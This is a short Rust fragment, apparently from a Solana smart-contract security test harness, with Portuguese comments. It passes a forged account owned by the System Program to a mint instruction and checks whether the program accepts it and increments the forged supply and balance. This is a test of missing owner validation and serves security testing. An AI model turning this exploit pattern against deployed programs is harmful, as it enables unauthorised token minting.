// Ataque: usa a conta forjada (owner = System Program, diferente do baseline)
let metas_attack = vec![AccountMeta::new(solana_sdk::system_program::id(), false)];
let ix_attack = env.raw_ix(&ix_data, metas_attack);
let r_attack = env.attack("mint com conta forjada (owner diferente)", &ix_attack, &[(solana_sdk::system_program::id(), forged_ledger.clone())]);

// Efeito: se o ataque teve sucesso, a conta forjada foi aceita e seus bytes 40..56 foram alterados
if r_attack.program_result == ProgramResult::Success {
    let after_forged = after(&r_attack, &solana_sdk::system_program::id());
    let new_supply = read_u64(after_forged.data(), 40);
    let new_balance = read_u64(after_forged.data(), 48);
    env.effect(
        "conta forjada (owner != baseline) foi aceita e teve supply/balance incrementados",
        new_supply == 999u64.wrapping_add(amount) && new_balance == 888u64.wrapping_add(amount),
    );
}
